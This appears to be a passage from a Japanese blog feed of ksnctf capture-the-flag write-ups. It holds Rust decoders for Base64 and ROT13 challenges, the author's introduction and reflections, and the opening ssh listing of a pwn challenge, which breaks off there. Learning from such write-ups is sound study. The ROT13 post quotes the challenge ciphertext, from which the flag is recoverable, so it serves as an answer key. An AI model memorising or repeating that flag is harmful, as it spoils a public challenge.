+    <span class="k">let</span> <span class="n">onion_str</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nf">get_decode_cipher</span><span class="p">(</span><span class="n">onion_str</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+    <span class="k">let</span> <span class="n">onion_str</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nf">get_decode_cipher</span><span class="p">(</span><span class="n">onion_str</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+    <span class="k">let</span> <span class="n">onion_str</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nf">get_decode_cipher</span><span class="p">(</span><span class="n">onion_str</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+    <span class="k">let</span> <span class="n">onion_str</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nf">get_decode_cipher</span><span class="p">(</span><span class="n">onion_str</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+    <span class="k">let</span> <span class="n">onion_str</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nf">get_decode_cipher</span><span class="p">(</span><span class="n">onion_str</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+    <span class="k">let</span> <span class="n">onion_str</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nf">get_decode_cipher</span><span class="p">(</span><span class="n">onion_str</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+    <span class="k">let</span> <span class="n">onion_str</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nf">get_decode_cipher</span><span class="p">(</span><span class="n">onion_str</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+    <span class="k">let</span> <span class="n">onion_str</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nf">get_decode_cipher</span><span class="p">(</span><span class="n">onion_str</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+    <span class="k">let</span> <span class="n">_onion_str</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nf">get_decode_cipher</span><span class="p">(</span><span class="n">onion_str</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
+
+    <span class="c1">// uuencode</span>
+    <span class="c1">// の良い感じのが見当たらなかったので、ブラウザ等で変換してください。</span>
+    <span class="c1">// https://uic.jp/uuencode/</span>
+<span class="p">}</span>
+
+<span class="k">fn</span> <span class="nf">get_decode_cipher</span><span class="p">(</span><span class="n">onion_str</span><span class="p">:</span> <span class="o">&amp;</span><span class="nb">str</span><span class="p">,</span> <span class="n">is_line</span><span class="p">:</span> <span class="nb">bool</span><span class="p">)</span> <span class="k">-&gt;</span> <span class="nb">String</span> <span class="p">{</span>
+    <span class="k">let</span> <span class="n">onion_u8</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nf">decode</span><span class="p">(</span><span class="n">onion_str</span><span class="p">)</span><span class="nf">.unwrap</span><span class="p">()[</span><span class="o">..</span><span class="p">];</span>
+    <span class="k">let</span> <span class="n">onion_string</span> <span class="o">=</span> <span class="nn">String</span><span class="p">::</span><span class="nf">from_utf8</span><span class="p">(</span><span class="n">onion_u8</span><span class="nf">.to_vec</span><span class="p">())</span><span class="nf">.unwrap</span><span class="p">();</span>
+
+    <span class="k">if</span> <span class="o">!</span><span class="n">is_line</span> <span class="p">{</span>
+        <span class="nd">println!</span><span class="p">(</span><span class="s">"-----------</span><span class="se">\n</span><span class="s">{}-----------"</span><span class="p">,</span> <span class="n">onion_string</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">onion_string</span>
+    <span class="p">}</span>
+
+    <span class="k">let</span> <span class="n">onion_string_all</span> <span class="o">=</span> <span class="n">onion_string</span><span class="nf">.lines</span><span class="p">()</span><span class="nf">.collect</span><span class="p">();</span>
+    <span class="nd">println!</span><span class="p">(</span><span class="s">"{}</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">onion_string_all</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">onion_string_all</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>　<code class="language-plaintext highlighter-rouge">true</code> <code class="language-plaintext highlighter-rouge">false</code> については、出力形式を改行付き文字列にするか否かである。 <code class="language-plaintext highlighter-rouge">Base64</code> は改行無しが望ましく、<code class="language-plaintext highlighter-rouge">uuencode</code> については改行が入っている方が望ましかったために、雑に bool 値を入れた。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">get_decode_cipher</code> を並べているのもなんとか整理したかったのだが、よく分からなかったので、これで良しとした。各自で高みを目指してください。</p>
+
+<h2 id="所感">所感</h2>
+<p>　最初はまったく手の付け方が分からなかったが、crypto ということで、腰を据えて頑張るぞと思って古典暗号から洗い直した。結局、公開鍵暗号については調べ切れていないが、無知の時よりは遥かによくなった。</p>
+
+<p>　そこで、問題文を見直してみて、これは<strong>＜暗号文＞</strong>が渡されているだけの問題であると判ずるに至った。</p>
+
+<p>　通常、暗号化においては<strong>＜平文＞＜暗号文＞＜鍵＞</strong>の三つがあり、これに加えて<strong>＜暗号化アルゴリズム＞</strong>も重要となる。</p>
+
+<p>　例えば、<strong>＜暗号文＞＜暗号化アルゴリズム＞</strong>があれば<strong>＜鍵＞</strong>をブルートフォースで仕留めることが可能だ。ショートカット法などアルゴリズムによってはより効率的な解き方があるだろう。</p>
+
+<p>　しかし今回は、<strong>＜暗号文＞</strong>のみであり、何をどうやっても<strong>＜平文＞</strong>に辿り着けない。このことに気付き愕然とした。なぜならば、暗号解読の基本的な要素が不足している、即ちこれは暗号解読とは関係のない解き方をするのではないかとさえ思えてきたからである。</p>
+
+<p>　また、改めて問題文を凝視してみると、どうにも違和感がある。やたら大文字が多いのだ。大文字が多いというのは普通ではない。暗号解読の時に見たいくつかの暗号文は16進数で構成されており大文字よりも数字の方が多かったのだ。問題文はまるでROT13のような古典暗号のようでありながら、そうではない。違和感を抱きつつもこの時は見過ごすしかなかった。</p>
+
+<p>　手詰まりを感じたのだが、 crypto の分類としか思えないわけで、暗号解読について調べ切れていないところさっと見渡してみた。</p>
+
+<p>　「暗号学的ハッシュ関数」という文字が目に入る。</p>
+
+<p>　ハッシュ関数では大文字がこれほど現れない。だから関係ないだろうと高を括っていた。そうは言っても手詰まりなのだから何かしら情報が欲しかった。ぼおっと眺めていくと、「SHA-1」のwikiで衝撃が走る。</p>
+
+<blockquote>
+  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SHA1("The quick brown fox jumps over the lazy dog")
+gives hexidecimal: 2fd4e1c6 7a2d28fc ed849ee1 bb76e739 1b93eb12
+gives Base64 binary to ASCII text encoding: L9ThxnotKPzthJ7hu3bnORuT6xI=
+</code></pre></div>  </div>
+</blockquote>
+
+<p>　問題文に類似する文字列。そこには Base64 というエンコーディング方式の存在が記されていた。</p>
+
+<p>　これをきっかけにして、今回の問題文を解くに至った。</p>
+
+<p>　思い返してみると、暗号学的ハッシュ関数では<strong>＜鍵＞</strong>を必要としない（必要とするものもあるらしいが）。基本的に<strong>＜平文＞＜暗号文＞</strong>だけで良いのだ。即ち今回の問題の状況にぴったりと当てはまる。そして、Base64 を始めとするエンコーディング方式も同様の条件を通過する。</p>
+
+<p>　暗号学的ハッシュ関数と一般的な暗号化アルゴリズムを比較すると、やはり別物なのだと改めて思う。明らかに後者の方がセキュリティとして堅牢だろう。</p>
+
+<p>　本文では解説しなかったが一行76文字というのもBase64の、というよりはメールソフトの特徴らしい。正確にはMINEでそう決めたのだそうだ。問題文の一行が76文字であるということを数えたことは無駄ではなく、Base64である確証を強めてくれていた。</p>
+
+<p>　意味不明な文字列であっても、意味付け可能な何かというのはやはり存在している。暗号解読の基礎知識も重要だが、目の前の暗号文の持つ特徴を正しく捉えることも重要だと感じる一問となった。</p>
+
+<p>　とはいえ、ブロック暗号とかも調べたので、そうした問題に早く取り組みたいところではある。</p>
+
+<p>　ところで、古典暗号を調べていた時にビックペン暗号というのに出会った。この暗号はとても美しかったので、良かった皆さんも見てみてくれたらと思います。</p>
+
+<p>　いやはや遠回りをしてしまったが解けて良かった。</p>
+
+<p>　ではではこの辺で。</p>
+
+<p>　</p>]]></content><author><name></name></author><category term="contents" /><category term="tech" /><category term="CTF_ksnctf" /></entry><entry><title type="html">ksnctf 001 Test Problem, はじめに</title><link href="/contents/tech/ctf_ksnctf/2021/05/18/001.html" rel="alternate" type="text/html" title="ksnctf 001 Test Problem, はじめに" /><published>2021-05-18T12:38:04+00:00</published><updated>2021-05-18T12:38:04+00:00</updated><id>/contents/tech/ctf_ksnctf/2021/05/18/001</id><content type="html" xml:base="/contents/tech/ctf_ksnctf/2021/05/18/001.html"><![CDATA[<h2 id="ksnctf-001-test-problem">ksnctf 001 Test Problem</h2>
+<ul>
+  <li>問題公開日: 2012/05/24</li>
+  <li>ジャンル: -</li>
+</ul>
+
+<h3 id="謎解き">謎解き</h3>
+<p>　謎なし。</p>
+
+<p>　問題文に答えが書いてある。</p>
+
+<p>　よし、やってやるぞ。</p>
+
+<h2 id="所感">所感</h2>
+
+<h3 id="はじめに">はじめに</h3>
+
+<p><a href="https://ksnctf.sweetduet.info">ksnctf</a></p>
+
+<blockquote>
+  <ul>
+    <li>問題の公開後3か月が経過していること
+      <ul>
+        <li>問題の公開日は問題文の右上に記載しています</li>
+      </ul>
+    </li>
+    <li>フラグの文字列は公開しないこと</li>
+  </ul>
+
+  <p>また、write-upを書くために、問題文や問題のファイルの解析結果などを転載することを許諾します。 ただし、一部の画像やライブラリなど、私以外の第三者が権利を持つファイルもあるので注意してください。</p>
+</blockquote>
+
+<h3 id="このブログについて">このブログについて</h3>
+
+<p>　<strong>数年前に同僚に誘われてCTFを知った。</strong>それから何度かイベントに出てみたが解けた問題は片手で数えられる程度しかない。知識理解はほぼ未経験者のそれと同レベルであり、経験があるなどとは口が裂けても言えない程度である。</p>
+
+<p>　その後、私はSEという職も辞してしまい、専門家として肩書も投げ捨ててしまった。専門家など片腹痛い。仕事をテキパキこなせていれば辞してなどいなかった。</p>
+
+<p>　のんびり過ごす中で、考えたことをまとめたり日記として残していきたいと感じ、 Web Log という形で情報を集約していくことにした。情報というのはひとえに「自らを解体すること」に基づく集合を指す。私の思ったこと・考えたこと・知ったこと・作ったものなどだ。私は自らを解体し続けることだけは死ぬまで続けられると考えているのである。</p>
+
+<p>　解体は遅々とした速度で進む。成果の一つとして、<strong>「謎」に対しての並々ならぬ興味の存在</strong>に自分自身でありながら驚かされた。</p>
+
+<p>　Webの流行りと共に現れたURLを行き来する遊びサイト、Flash時代に流行った脱出ゲーム、リアル脱出ゲーム、パズルゲーム、謎を主体にしたフリーゲーム。</p>
+
+<p>　RPGやACTで敵と戦う時にも重なり合う小さな謎（弱点、手順、回避、攻撃）を紐解いて戦っている。</p>
+
+<p>　小説や映像では、伏線を解決していく瞬間、どんでん返しのような想像もしなかった結末、一つの点を舞台にして視点が交差していく群像劇などはまさに謎を紐解くいている感覚と言える。</p>
+
+<p>　私の根底に、いや人の根底に「謎」に対する興味があると感じたその時、数年前の同僚を思い出し、CTFを思い出した。</p>
+
+<p>　あの頃は知識理解が無さ過ぎた。</p>
+
+<p>　解体を進めるためにも私は謎を解かなくてはならない。謎のジャンルは問わない。ゲームを遊ぶでも小説を読むでも。</p>
+
+<p>　触れてみよう。</p>
+
+<p>　このブログは私自身を解体する道である。</p>
+
+<p>　CTFはその道中の一つであり、謎の一つである。</p>
+
+<p>　イベントに参加しようと思ったが、今はしっかりと地に足をつけてCTFに触れていきたい。そこで常設のksnctfに辿り着く。</p>
+
+<p>　問題を解くことが目的ではなく、<strong>問題について知ること・問題に関係している用語や概念を自分の中で整理分類していくこと</strong>を目的としてksnctfと言うサイトを活用していきたい。</p>
+
+<h3 id="記事の形式">記事の形式</h3>
+
+<ul>
+  <li>問題と解法</li>
+  <li>所感</li>
+</ul>
+
+<p>　<strong>謎とは「問題が何かを見極める瞬間」「あれやこれやと悩む時間」「手法と解答への疑念を払拭するための論理補強」「解答を入力する瞬間」など楽しい時間で満ちている。</strong></p>
+
+<p>　良質な謎・良質なCTFは限られている。1問1問を、私の些細な記事によって殺したくはない。可能ならぜひ自力で解いてみて欲しい。どうしてもという時にヒントとして数行を読んでみるというのはありだろう。お好きに参考にしてくれて構わない。が、</p>
+
+<p>　<strong>記事の質は低いと考えてもらいたい</strong>。全ての問題を十分な知識と理解を持って解けたと言えるとは現時点で到底想像できない。それを承知の上で、私が生きた Log として記事を書いていく。質の高低は気にせずに、<strong>主観的な納得感に従って進む</strong>と考えて欲しい。</p>
+
+<p>　可能ならばちゃんと全問解く。人生後50年あるとすれば、1年1問でも間に合う。そういう気持ちでやって行く。</p>
+
+<h3 id="知識">知識</h3>
+
+<p>　このブログの『Memo』というページにまとめていく。（見つからなければ名称が変わった可能性がある。探せばどこかにあるはず）</p>
+
+<p>　ヘッダーから飛んで欲しい。</p>
+
+<h3 id="おわりに">おわりに</h3>
+
+<p>　とまあ、こんな形で、所感を述べていく。</p>
+
+<p>　はいでは。</p>]]></content><author><name></name></author><category term="contents" /><category term="tech" /><category term="CTF_ksnctf" /></entry><entry><title type="html">ksnctf 002 Easy Cipher</title><link href="/contents/tech/ctf_ksnctf/2021/05/18/002.html" rel="alternate" type="text/html" title="ksnctf 002 Easy Cipher" /><published>2021-05-18T12:38:04+00:00</published><updated>2021-05-18T12:38:04+00:00</updated><id>/contents/tech/ctf_ksnctf/2021/05/18/002</id><content type="html" xml:base="/contents/tech/ctf_ksnctf/2021/05/18/002.html"><![CDATA[<h2 id="ksnctf-002-easy-cipher">ksnctf 002 Easy Cipher</h2>
+<ul>
+  <li>問題公開日: 2012/05/24</li>
+  <li>ジャンル: crypto</li>
+</ul>
+
+<h3 id="謎解き">謎解き</h3>
+
+<p>　どうやら文章が書かれているのだが、読めるようになっていない。</p>
+
+<p>　それでも規則性はあるようで、一定間隔で空白が存在する。</p>
+
+<p>　使われている文字もアルファベットであることから、これは英語の文章と考えられる。</p>
+
+<p>　英単語でかつ、一文字、二文字となれば、かなり絞れるだろうと考えてみると、</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>字数</th>
+      <th>例</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>1</td>
+      <td>a, I</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>am, an, as, at, be, by, do, go, hi, id, if, is, it, me, my, of, on, or, so, to, up, we, …</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>　一文字はこれしかないだろう。ただ、二文字については考えてみると案外量がある。</p>
+
+<p>　問題文に目を通すと、 一文字では <code class="language-plaintext highlighter-rouge">n</code> がある。文頭で使われていないことから、 I ではなく <code class="language-plaintext highlighter-rouge">a</code> と考えられる。</p>
+
+<p>　二文字については、 <code class="language-plaintext highlighter-rouge">vf</code>, <code class="language-plaintext highlighter-rouge">vg</code>, <code class="language-plaintext highlighter-rouge">va</code>, <code class="language-plaintext highlighter-rouge">na</code>, <code class="language-plaintext highlighter-rouge">bs</code> がある。</p>
+
+<p>　正直言って確定は難しい。</p>
+
+<p>　そこで、文章のまとまりで見てみると、閃いた。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">EBG KVVV vf n fvzcyr</code> が文頭にあるが、 <code class="language-plaintext highlighter-rouge">〇〇 is a △△</code> と書かれているような気がしてくる。仮置きでこれを正解とすれば、以下のようになる。</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>前</th>
+      <th>後</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">n</code></td>
+      <td><code class="language-plaintext highlighter-rouge">a</code></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">v</code></td>
+      <td><code class="language-plaintext highlighter-rouge">i</code></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">f</code></td>
+      <td><code class="language-plaintext highlighter-rouge">s</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>　3つもあれば規則性を叩き出せるだろうと考えてみると、なるほど分かった。13個ずれている。</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">nopqrstuvwxyzabcdefghijklm</code></li>
+  <li><code class="language-plaintext highlighter-rouge">abcdefghijklmnopqrstuvwxyz</code></li>
+</ul>
+
+<p>　13個ずらすと、仮置きを満たすような並びになっている。これを元に順番に読んでいくと確かに文章になっているようだった。</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">EBG KVVV vf n fvzcyr yrggre fhofgvghgvba pvcure</code></li>
+  <li><code class="language-plaintext highlighter-rouge">ROT XIII is a simple letter substitution cipher</code></li>
+</ul>
+
+<p>　なるほど。どうやらこれは <code class="language-plaintext highlighter-rouge">ROT13</code> と呼ばれる暗号文らしい。調べてみるとwikiも存在したので、正解と思われる。</p>
+
+<p>　ROT13 とはまさに13個ずらして作る暗号文であるようだ。</p>
+
+<h3 id="解く">解く</h3>
+<p>　規則性が分かったので、一文字ずつ解いていっても良いが、せっかくなのでプログラムを書く。最近Rustの勉強をしており、丁度良い題材である。</p>
+
+<p>　というわけで、プログラムを書いた。</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">let</span> <span class="n">cryptogram</span> <span class="o">=</span> <span class="nn">String</span><span class="p">::</span><span class="nf">from</span><span class="p">(</span><span class="s">"EBG KVVV vf n fvzcyr yrggre fhofgvghgvba pvcure gung ercynprf n yrggre jvgu gur yrggre KVVV yrggref nsgre vg va gur nycunorg. EBG KVVV vf na rknzcyr bs gur Pnrfne pvcure, qrirybcrq va napvrag Ebzr. Synt vf SYNTFjmtkOWFNZdjkkNH. Vafreg na haqrefpber vzzrqvngryl nsgre SYNT."</span><span class="p">);</span>
+
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">plain</span> <span class="o">=</span> <span class="nn">String</span><span class="p">::</span><span class="nf">from</span><span class="p">(</span><span class="s">""</span><span class="p">);</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="k">in</span> <span class="n">cryptogram</span><span class="nf">.as_str</span><span class="p">()</span><span class="nf">.chars</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">match</span> <span class="n">c</span> <span class="p">{</span>
+            <span class="sc">'a'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'n'</span><span class="p">),</span>
+            <span class="sc">'b'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'o'</span><span class="p">),</span>
+            <span class="sc">'c'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'p'</span><span class="p">),</span>
+            <span class="sc">'d'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'q'</span><span class="p">),</span>
+            <span class="sc">'e'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'r'</span><span class="p">),</span>
+            <span class="sc">'f'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'s'</span><span class="p">),</span>
+            <span class="sc">'g'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'t'</span><span class="p">),</span>
+            <span class="sc">'h'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'u'</span><span class="p">),</span>
+            <span class="sc">'i'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'v'</span><span class="p">),</span>
+            <span class="sc">'j'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'w'</span><span class="p">),</span>
+            <span class="sc">'k'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'x'</span><span class="p">),</span>
+            <span class="sc">'l'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'y'</span><span class="p">),</span>
+            <span class="sc">'m'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'z'</span><span class="p">),</span>
+            <span class="sc">'n'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'a'</span><span class="p">),</span>
+            <span class="sc">'o'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'b'</span><span class="p">),</span>
+            <span class="sc">'p'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'c'</span><span class="p">),</span>
+            <span class="sc">'q'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'d'</span><span class="p">),</span>
+            <span class="sc">'r'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'e'</span><span class="p">),</span>
+            <span class="sc">'s'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'f'</span><span class="p">),</span>
+            <span class="sc">'t'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'g'</span><span class="p">),</span>
+            <span class="sc">'u'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'h'</span><span class="p">),</span>
+            <span class="sc">'v'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'i'</span><span class="p">),</span>
+            <span class="sc">'w'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'j'</span><span class="p">),</span>
+            <span class="sc">'x'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'k'</span><span class="p">),</span>
+            <span class="sc">'y'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'l'</span><span class="p">),</span>
+            <span class="sc">'z'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'m'</span><span class="p">),</span>
+            <span class="sc">'A'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'N'</span><span class="p">),</span>
+            <span class="sc">'B'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'O'</span><span class="p">),</span>
+            <span class="sc">'C'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'P'</span><span class="p">),</span>
+            <span class="sc">'D'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'Q'</span><span class="p">),</span>
+            <span class="sc">'E'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'R'</span><span class="p">),</span>
+            <span class="sc">'F'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'S'</span><span class="p">),</span>
+            <span class="sc">'G'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'T'</span><span class="p">),</span>
+            <span class="sc">'H'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'U'</span><span class="p">),</span>
+            <span class="sc">'I'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'V'</span><span class="p">),</span>
+            <span class="sc">'J'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'W'</span><span class="p">),</span>
+            <span class="sc">'K'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'X'</span><span class="p">),</span>
+            <span class="sc">'L'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'Y'</span><span class="p">),</span>
+            <span class="sc">'M'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'Z'</span><span class="p">),</span>
+            <span class="sc">'N'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'A'</span><span class="p">),</span>
+            <span class="sc">'O'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'B'</span><span class="p">),</span>
+            <span class="sc">'P'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'C'</span><span class="p">),</span>
+            <span class="sc">'Q'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'D'</span><span class="p">),</span>
+            <span class="sc">'R'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'E'</span><span class="p">),</span>
+            <span class="sc">'S'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'F'</span><span class="p">),</span>
+            <span class="sc">'T'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'G'</span><span class="p">),</span>
+            <span class="sc">'U'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'H'</span><span class="p">),</span>
+            <span class="sc">'V'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'I'</span><span class="p">),</span>
+            <span class="sc">'W'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'J'</span><span class="p">),</span>
+            <span class="sc">'X'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'K'</span><span class="p">),</span>
+            <span class="sc">'Y'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'L'</span><span class="p">),</span>
+            <span class="sc">'Z'</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="sc">'M'</span><span class="p">),</span>
+            <span class="n">_</span> <span class="k">=&gt;</span> <span class="n">plain</span><span class="nf">.push</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="nd">println!</span><span class="p">(</span><span class="s">"---- cryptogram ----"</span><span class="p">);</span>
+    <span class="nd">println!</span><span class="p">(</span><span class="s">"{}"</span><span class="p">,</span> <span class="n">cryptogram</span><span class="p">);</span>
+    <span class="nd">println!</span><span class="p">(</span><span class="s">"---- plain ----"</span><span class="p">);</span>
+    <span class="nd">println!</span><span class="p">(</span><span class="s">"{}"</span><span class="p">,</span> <span class="n">plain</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>　match 式のところが無理やりになってしまった。良い書き方をいろいろ考えたのだが、さっぱり分からなかった。ROT13よりもRustの文字列の扱いの方が遥かに謎深い。</p>
+
+<p>　ともかく、これでFLAGを獲得出来た。クリア。</p>
+
+<h2 id="所感">所感</h2>
+
+<p>　CTFと言えば pwn だと同僚は言っていたのだが、pwnはさっぱり分からなかった。一方で crypto は規則性を見つける遊びのように当時感じて、crypto だけ解いてた。</p>
+
+<p>　その時に、ROT13 にも触れた記憶があるのだが、ROT13の wiki を見るまで思い出すことはなかった。</p>
+
+<p>　今回の問題は見ていたら解けてしまったパターンなので、あまり論理的ではないし、広い視野から問題を見つめたわけでもないので、正直微妙な手応えである。</p>
+
+<p>　ただ、何はともあれ ksnctf の問題をちゃんと解けたのは実質これが初めてとなるので、良しとした。なんやかんやFLAGを見つけると嬉しいものである。</p>
+
+<p>　次回の crypto では、ROT13を起点にして暗号の歴史でも紐解ければと思う。</p>
+
+<p>　
+　
+　</p>]]></content><author><name></name></author><category term="contents" /><category term="tech" /><category term="CTF_ksnctf" /></entry><entry><title type="html">ksnctf 004 Villager A</title><link href="/contents/tech/ctf_ksnctf/2021/05/18/004.html" rel="alternate" type="text/html" title="ksnctf 004 Villager A" /><published>2021-05-18T12:38:04+00:00</published><updated>2021-05-18T12:38:04+00:00</updated><id>/contents/tech/ctf_ksnctf/2021/05/18/004</id><content type="html" xml:base="/contents/tech/ctf_ksnctf/2021/05/18/004.html"><![CDATA[<h2 id="ksnctf-004-villager-a">ksnctf 004 Villager A</h2>
+<ul>
+  <li>問題公開日: 2012/05/26</li>
+  <li>ジャンル: pwn</li>
+</ul>
+
+<h3 id="謎解き">謎解き</h3>
+<p>　<code class="language-plaintext highlighter-rouge">ssh</code> で接続して向こうのサーバーで作業を行うスタイルのようだ。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>q4@eceec62b961b ~]<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 12
+<span class="nt">-r--r-----</span> 1 root q4a   22 Feb 26 18:01 flag.txt
+<span class="nt">-r-xr-sr-x</span> 1 root q4a 5857 Feb 26 18:01 q4
+</code></pre></div></div>
+
